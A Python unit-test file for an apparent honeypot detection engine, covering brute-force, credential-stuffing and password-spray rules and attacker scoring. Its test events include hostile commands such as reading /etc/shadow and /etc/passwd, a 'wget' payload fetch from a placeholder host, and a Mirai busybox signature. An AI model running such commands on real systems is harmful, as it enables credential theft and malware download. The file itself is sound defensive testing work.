"""Unit tests for the detection rule engine and scoring model.

The rule engine is pure (events in, alert dicts out), so these tests build event
lists directly and never touch a database. That is deliberate: a detection rule
is a claim about a *shape of behaviour*, and the test should be able to state
that shape as plainly as possible.
"""

from __future__ import annotations

import datetime as dt

import pytest

from pipeline.detection.rules import (
    Rule,
    RuleError,
    evaluate_rule,
    evaluate_rules,
    load_rules,
    matches,
)
from pipeline.detection.scoring import classify, explain, score_attacker, severity_for_score
from storage.models import utcnow

# --------------------------------------------------------------------------- #
# Rule loading and validation
# --------------------------------------------------------------------------- #


class TestRuleLoading:
    def test_shipped_rules_load(self):
        rules = load_rules()
        assert len(rules) >= 15
        assert all(r.id for r in rules)

    def test_rule_ids_are_unique(self):
        rules = load_rules()
        ids = [r.id for r in rules]
        assert len(ids) == len(set(ids))

    def test_bad_type_rejected(self):
        with pytest.raises(RuleError, match="unknown type"):
            Rule(id="x", name="x", severity="high", type="nonsense").validate()

    def test_distinct_requires_field(self):
        with pytest.raises(RuleError, match="distinct_field"):
            Rule(id="x", name="x", severity="high", type="distinct").validate()

    def test_bad_severity_rejected(self):
        with pytest.raises(RuleError, match="severity"):
            Rule(id="x", name="x", severity="apocalyptic", type="match").validate()


# --------------------------------------------------------------------------- #
# Condition matching
# --------------------------------------------------------------------------- #


class TestMatches:
    def test_equality(self, make_event):
        event = make_event(service="ssh")
        assert matches(event, {"service": "ssh"})
        assert not matches(event, {"service": "http"})

    def test_membership(self, make_event):
        event = make_event(service="ssh")
        assert matches(event, {"service": ["ssh", "telnet"]})
        assert not matches(event, {"service": ["http", "ftp"]})

    def test_contains_is_case_insensitive(self, make_event):
        event = make_event(command="CAT /etc/shadow")
        assert matches(event, {"command__contains": "/etc/shadow"})

    def test_in_tags(self, make_event):
        event = make_event(tags=["mirai-signature", "payload-fetch"])
        assert matches(event, {"tags__in_tags": "mirai-signature"})
        assert not matches(event, {"tags__in_tags": "log4shell"})

    def test_gte(self, make_event):
        event = make_event(threat_score=55.0)
        assert matches(event, {"threat_score__gte": 40})
        assert not matches(event, {"threat_score__gte": 60})

    def test_all_conditions_must_hold(self, make_event):
        event = make_event(service="ssh", event_type="auth_attempt")
        assert matches(event, {"service": "ssh", "event_type": "auth_attempt"})
        assert not matches(event, {"service": "ssh", "event_type": "command"})

    def test_unknown_operator_raises(self, make_event):
        with pytest.raises(RuleError, match="unknown operator"):
            matches(make_event(), {"field__weird": 1})


# --------------------------------------------------------------------------- #
# Sliding-window evaluation
# --------------------------------------------------------------------------- #


class TestThresholdRule:
    def _rule(self, **kw) -> Rule:
        base = dict(
            id="test_bf",
            name="bf",
            severity="high",
            type="threshold",
            window_minutes=10,
            group_by="src_ip",
            threshold=20,
            where={"event_type": "auth_attempt"},
        )
        base.update(kw)
        return Rule(**base)

    def test_fires_when_threshold_met(self, burst):
        events = burst(20, spacing_seconds=5, ago_minutes=5)
        alerts = evaluate_rule(self._rule(), events)
        assert len(alerts) == 1
        assert alerts[0]["evidence"]["observed"] == 20.0

    def test_does_not_fire_below_threshold(self, burst):
        events = burst(19, spacing_seconds=5, ago_minutes=5)
        assert evaluate_rule(self._rule(), events) == []

    def test_slow_drip_outside_window_does_not_fire(self, burst):
        # 30 events but spread over 40 minutes: no 10-minute span holds 20.
        events = burst(30, spacing_seconds=80, ago_minutes=40)
        assert evaluate_rule(self._rule(), events) == []

    def test_detects_old_events_not_just_recent(self, burst):
        # The whole point of sliding windows: a burst from a week ago still fires.
        events = burst(25, spacing_seconds=5, ago_minutes=60 * 24 * 7)
        alerts = evaluate_rule(self._rule(), events)
        assert len(alerts) == 1

    def test_groups_by_source(self, burst):
        events = burst(20, src_ip="192.0.2.1", spacing_seconds=5) + burst(
            20, src_ip="192.0.2.2", spacing_seconds=5
        )
        alerts = evaluate_rule(self._rule(), events)
        assert {a["src_ip"] for a in alerts} == {"192.0.2.1", "192.0.2.2"}


class TestDistinctRule:
    def _rule(self, **kw) -> Rule:
        base = dict(
            id="cred_stuff",
            name="cs",
            severity="high",
            type="distinct",
            window_minutes=30,
            group_by="src_ip",
            distinct_field="username",
            threshold=15,
            where={"event_type": "auth_attempt"},
        )
        base.update(kw)
        return Rule(**base)

    def test_fires_on_distinct_usernames(self, make_event):
        base = utcnow()
        events = [
            make_event(username=f"user{i}", ts=base + dt.timedelta(seconds=i)) for i in range(15)
        ]
        alerts = evaluate_rule(self._rule(), events)
        assert len(alerts) == 1
        assert alerts[0]["evidence"]["observed"] == 15.0

    def test_repeated_same_username_does_not_count(self, make_event):
        base = utcnow()
        events = [make_event(username="root", ts=base + dt.timedelta(seconds=i)) for i in range(40)]
        assert evaluate_rule(self._rule(), events) == []


class TestMatchRule:
    def test_single_matching_event_fires(self, make_event):
        rule = Rule(
            id="log4shell",
            name="l4s",
            severity="critical",
            type="match",
            window_minutes=60,
            group_by="src_ip",
            where={"tags__in_tags": "log4shell"},
        )
        events = [make_event(tags=["log4shell"])]
        alerts = evaluate_rule(rule, events)
        assert len(alerts) == 1
        assert alerts[0]["severity"] == "critical"

    def test_no_match_no_alert(self, make_event):
        rule = Rule(
            id="log4shell",
            name="l4s",
            severity="critical",
            type="match",
            window_minutes=60,
            group_by="src_ip",
            where={"tags__in_tags": "log4shell"},
        )
        assert evaluate_rule(rule, [make_event(tags=["something-else"])]) == []


class TestPasswordSpray:
    def test_groups_by_password_not_ip(self, make_event):
        # One password against many accounts from *different* IPs — the pattern
        # per-account and per-IP counters both miss.
        base = utcnow()
        events = [
            make_event(
                username=f"user{i}",
                password="Winter2024",
                src_ip=f"192.0.2.{i}",
                ts=base + dt.timedelta(seconds=i),
            )
            for i in range(12)
        ]
        rule = Rule(
            id="spray",
            name="spray",
            severity="high",
            type="distinct",
            window_minutes=60,
            group_by="password",
            distinct_field="username",
            threshold=10,
            where={"event_type": "auth_attempt"},
        )
        alerts = evaluate_rule(rule, events)
        assert len(alerts) == 1
        assert alerts[0]["evidence"]["group_value"] == "Winter2024"


class TestBrokenRuleIsolation:
    def test_one_broken_rule_does_not_stop_others(self, make_event, monkeypatch):
        good = Rule(
            id="good",
            name="g",
            severity="high",
            type="match",
            window_minutes=60,
            group_by="src_ip",
            where={"tags__in_tags": "x"},
        )
        bad = Rule(
            id="bad",
            name="b",
            severity="high",
            type="match",
            window_minutes=60,
            group_by="src_ip",
            where={"field__badop": 1},
        )
        events = [make_event(tags=["x"])]
        # evaluate_rules must swallow the bad rule and still return the good hit.
        alerts = evaluate_rules(events, [bad, good])
        assert any(a["rule_id"] == "good" for a in alerts)


# --------------------------------------------------------------------------- #
# Scoring
# --------------------------------------------------------------------------- #


class TestScoring:
    def test_empty_events_score_zero(self):
        score, classification, tags = score_attacker(None, [])
        assert score == 0.0
        assert classification == "low-signal"

    def test_post_exploitation_outscores_volume(self, make_event, burst):
        # 500 connects vs. a shell + a couple of commands. Access must win.
        noisy = burst(500, spacing_seconds=0.5, event_type="connect", severity="info")
        score_noisy, _, _ = score_attacker(None, noisy)

        intrusion = [
            make_event(event_type="auth_success", severity="high", tags=["shell-granted"]),
            make_event(event_type="command", severity="high", command="whoami"),
            make_event(
                event_type="command",
                severity="critical",
                command="wget http://x/m",
                tags=["payload-fetch"],
            ),
        ]
        score_intrusion, _, _ = score_attacker(None, intrusion)
        assert score_intrusion > score_noisy

    def test_score_is_bounded(self, burst):
        events = burst(
            5000,
            spacing_seconds=0.1,
            event_type="command",
            severity="critical",
            tags=["payload-fetch", "mirai-signature"],
        )
        score, _, _ = score_attacker(None, events)
        assert 0 <= score <= 100

    def test_iot_signature_classifies_as_botnet(self, make_event):
        events = [
            make_event(event_type="auth_attempt", tags=["iot-default-credential"]),
            make_event(
                event_type="command", command="/bin/busybox ECCHI", tags=["mirai-signature"]
            ),
        ]
        classification, _tags = classify(None, events)
        assert classification == "botnet-loader"

    def test_hands_on_keyboard_classifies_as_targeted(self, make_event):
        events = [
            make_event(event_type="auth_success", tags=["shell-granted"]),
            make_event(event_type="command", command="whoami"),
            make_event(event_type="command", command="cat /etc/passwd"),
            make_event(event_type="command", command="ls -la /root"),
        ]
        classification, _tags = classify(None, events)
        assert classification == "targeted-intrusion"

    def test_explain_components_sum_to_raw(self, burst):
        events = burst(50, event_type="auth_attempt", severity="medium")
        result = explain(None, events)
        assert abs(sum(result["components"].values()) - result["raw_score"]) < 0.01

    def test_recency_decay_lowers_old_scores(self, make_event, burst):
        recent = burst(30, event_type="command", severity="high", ago_minutes=1)
        old = burst(30, event_type="command", severity="high", ago_minutes=60 * 24 * 90)
        assert score_attacker(None, recent)[0] > score_attacker(None, old)[0]

    @pytest.mark.parametrize(
        "score,band",
        [(90, "critical"), (70, "high"), (40, "medium"), (20, "low"), (5, "info")],
    )
    def test_severity_bands(self, score, band):
        assert severity_for_score(score) == band
